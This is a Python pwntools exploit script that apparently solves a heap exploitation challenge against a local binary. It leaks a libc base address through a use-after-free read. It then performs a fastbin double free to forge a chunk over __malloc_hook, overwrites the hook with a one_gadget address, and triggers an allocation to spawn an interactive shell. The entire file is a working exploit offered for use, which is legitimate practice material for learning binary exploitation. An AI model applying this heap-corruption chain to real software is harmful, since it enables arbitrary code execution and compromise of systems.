#!/usr/bin/env python3
# Author : trustie_rity
from pwn import *
context.update(arch="amd64",os="linux")
context.terminal = ['alacritty', '-e', 'zsh', '-c']

elf = ELF("./old_patched")
p = elf.process()

# gdb hack
def _new_binary():
 return "gdb-pwndbg"
gdb.binary = _new_binary
gdbscript = """
c
"""
sla = lambda a,b: p.sendlineafter(a,b)
s = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
ru = lambda a: p.recvuntil(a)
r = lambda : p.recv()
rl = lambda : p.recvline()

#gdb.attach(p , gdbscript=gdbscript)

def add(idx, size):
    sla(b"> " , b"1")
    sla(b"idx: " , str(idx).encode())
    sla(b"size: " , str(size).encode())

def delete(idx):
    sla(b"> " , b"2")
    sla(b"idx: " , str(idx).encode())

def write(idx, contents):
    sla(b"> " , b"3")
    sla(b"idx: " , str(idx).encode())
    sla(b"contents: " , contents)

def view(idx):
    sla(b"> " , b"4")
    sla(b"idx: " , str(idx).encode())
    ru(b"data: ")
    leak = ru(b"[")
    return leak

add(0,0x80)
write(0, b"chunk 0")
add(1,24)
write(1, b"chunk 1")
add(2,24)
write(2, b"chunk 2")
add(3,24)
write(3, b"chunk 3")
add(4,24)
write(4, b"chunk 4")
# leak libc address
delete(0)

leak = view(0).rstrip(b"[")
leak = u64(leak.ljust(8,b"\x00"))
libc = elf.libc
libc.address = leak - 0x3c4b78
log.info(f"Libc base @ : {hex(libc.address)}")

# keep the unsorted bin full , so that we dont get allocations from there!
add(0,0x80)
write(0 ,b"A"*30)

# make use of fastbin dup technique

add(2, 0x60)
add(3, 0x60)
delete(2)
delete(3)
delete(2)

malloc_hook = libc.sym.__malloc_hook
add(2,0x60)
write(2, p64(malloc_hook-35)+b"After fake chunk")
add(3,0x60)
write(3 , b"B"*10)
add(4,0x60)
write(4 , b"C"*10)
add(5,0x60)
log.info(f"Fake chunk @ : {hex(malloc_hook - 35)}")
write(5 , b"A" * 19 + p64(libc.address + 0x4527a))

# trigger the exploit
sla(b"> " , b"1")
sla(b"idx: " , str(8).encode())
sla(b"size: " , str(10).encode())

p.interactive()
